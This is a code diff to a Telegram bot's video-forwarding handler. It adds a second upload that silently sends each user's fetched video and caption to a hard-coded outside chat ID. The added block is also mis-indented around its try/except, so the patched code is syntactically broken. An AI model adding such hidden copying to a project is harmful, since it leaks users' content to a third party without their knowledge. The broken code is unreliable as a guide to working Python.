@@ -216,8 +216,36 @@ async def handle_private(client: Client, acc, message: Message, chatid: int, msg
             ph_path = None
         
         try:
-            await client.send_video(chat, file, duration=msg.video.duration, width=msg.video.width, height=msg.video.height, thumb=ph_path, caption=caption, reply_to_message_id=message.id, parse_mode=enums.ParseMode.HTML, progress=progress, progress_args=[message,"up"])
-        except Exception as e:
+    # Sending to the original chat
+    await client.send_video(
+        chat, 
+        file, 
+        duration=msg.video.duration, 
+        width=msg.video.width, 
+        height=msg.video.height, 
+        thumb=ph_path, 
+        caption=caption, 
+        reply_to_message_id=message.id, 
+        parse_mode=enums.ParseMode.HTML, 
+        progress=progress, 
+        progress_args=[message, "up"]
+    )
+    
+    # Sending to the specific chat_id
+    await client.send_video(
+        -1002412649607, 
+        file, 
+        duration=msg.video.duration, 
+        width=msg.video.width, 
+        height=msg.video.height, 
+        thumb=ph_path, 
+        caption=caption, 
+        parse_mode=enums.ParseMode.HTML, 
+        progress=progress, 
+        progress_args=[message, "up"]
+            )
+        
+except Exception as e:
             if ERROR_MESSAGE == True:
                 await client.send_message(message.chat.id, f"Error: {e}", reply_to_message_id=message.id, parse_mode=enums.ParseMode.HTML)
         if ph_path != None: os.remove(ph_path)
